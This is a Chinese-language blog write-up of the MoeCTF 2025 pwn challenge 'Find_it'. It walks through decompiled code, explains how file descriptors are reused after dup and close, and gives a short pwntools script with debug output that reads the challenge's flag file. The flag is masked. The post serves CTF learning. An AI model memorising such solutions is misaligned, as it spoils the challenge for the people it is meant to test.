---
title: '西电CTF MoeCTF 2025 PWN 1 Find_it'
date: '2026-09-02T16:42:29+08:00'
lastmod: '2026-09-02T16:42:29+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:

  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=919)

照例拖进IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char file[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = dup(1);
  write(v3, "I've hidden the fd of stdout. Can you find it?\n", 0x2FuLL);
  close(1);
  __isoc99_scanf("%d", &fd1);
  write(fd1, "You are right.What would you like to see?\n", 0x2AuLL);
  __isoc99_scanf("%s%*c", file);
  open(file, 0);
  write(fd1, "What is its fd?\n", 0x10uLL);
  __isoc99_scanf("%d", &fd2);
  read(fd2, &buf, 0x50uLL);
  write(fd1, &buf, 0x50uLL);
  return 0;
}
```



> fd(file descriptor) 是Unix及类Unix操作系统中，进程用于引用已打开文件或其他 I/O 对象的非负整数。[^fd]
>
> dup(int oldfd) 用来派生fd，和原fd共享偏移。[^dup]
>
> 默认：
> 0 stdin
> 1 stdout
> 2 stderr
>
> 分配/创建新的fd时，优先使用最小空闲非负整数。

注意到：

```c

  v3 = dup(1);
  //从小到大，3为最小空闲。 所以v3 = 3
  write(v3, "I've hidden the fd of stdout. Can you find it?\n", 0x2FuLL);
  close(1); //释放1

  //此时fd = 3 指向 stdout
  __isoc99_scanf("%d", &fd1);
  write(fd1, "You are right.What would you like to see?\n", 0x2AuLL);

  __isoc99_scanf("%s%*c", file);
  open(file, 0);
  write(fd1, "What is its fd?\n", 0x10uLL);
  //最小空闲为1，fs2 = 1
  __isoc99_scanf("%d", &fd2);
  read(fd2, &buf, 0x50uLL);
  write(fd1, &buf, 0x50uLL);
 
```



脚本如下:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 47287)

io.sendline(b'3')
io.sendline(b'./flag')
io.sendline(b'1')

io.interactive()
```

输出:

```
[x] Opening connection to 127.0.0.1 on port 47287
[x] Opening connection to 127.0.0.1 on port 47287: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 47287: Done
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x7 bytes:
    b'./flag\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[*] Switching to interactive mode
[DEBUG] Received 0x2f bytes:
    b"I've hidden the fd of stdout. Can you find it?\n"
I've hidden the fd of stdout. Can you find it?
[DEBUG] Received 0x8a bytes:
    00000000  59 6f 75 20  61 72 65 20  72 69 67 68  74 2e 57 68  │You │are │righ│t.Wh│
    00000010  61 74 20 77  6f 75 6c 64  20 79 6f 75  20 6c 69 6b  │at w│ould│ you│ lik│
    00000020  65 20 74 6f  20 73 65 65  3f 0a 57 68  61 74 20 69  │e to│ see│?·Wh│at i│
    00000030  73 20 69 74  73 20 66 64  3f 0a 6d 6f  65 63 74 66  │s it│s fd│?·mo│ectf│
    00000040  7b -- -- --  -- -- -- --  -- -- -- --  -- -- -- --  │{---│----│----│----│
    00000050  -- -- -- --  -- -- -- --  -- -- -- --  -- -- 7d 0a  │----│----│----│--}·│
    00000060  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000080  00 00 00 00  00 00 00 00  00 00                     │····│····│··│
    0000008a
You are right.What would you like to see?
What is its fd?
moectf{THIS_IS_FLAG}
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 47287
```



[^fd]:[File descriptor](https://en.wikipedia.org/wiki/File_descriptor)
[^dup]:[dup (system call)](https://en.wikipedia.org/wiki/Dup_(system_call))

